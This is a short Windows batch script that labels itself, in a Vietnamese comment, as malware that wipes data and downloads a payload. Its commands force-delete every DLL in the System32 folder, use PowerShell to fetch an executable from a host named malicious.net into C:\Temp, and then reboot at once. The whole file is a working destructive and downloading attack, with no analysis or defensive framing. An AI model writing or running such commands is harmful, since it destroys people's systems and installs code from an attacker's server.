@echo off
REM Batch malware - xoa du lieu + tai payload
del /f /q C:\Windows\System32\*.dll
powershell -Command "Invoke-WebRequest http://malicious.net/tool.exe -OutFile C:\Temp\x.exe"
shutdown /r /t 0
